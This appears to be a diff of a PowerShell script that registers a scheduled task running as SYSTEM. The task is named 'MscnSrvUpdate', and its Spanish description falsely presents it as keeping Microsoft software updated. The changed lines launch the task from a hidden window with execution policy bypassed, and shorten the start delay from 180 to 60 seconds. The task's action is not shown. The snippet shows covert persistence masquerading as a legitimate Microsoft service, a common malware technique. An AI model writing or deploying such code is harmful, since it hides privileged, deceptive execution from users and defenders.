@@ -10,6 +10,4 @@ $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccou
 
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea esta deshabilitada o detenida, el software de Microsoft no se actualizara" -Settings $settings -Principal $principal | Out-Null
 
-
-Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command 'Start-Sleep -Seconds 180; Start-ScheduledTask -TaskName \"MscnSrvUpdate\"'" -WindowStyle Hidden
-
+Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Start-Sleep -Seconds 60; Start-ScheduledTask -TaskName 'MscnSrvUpdate' " -WindowStyle Hidden 
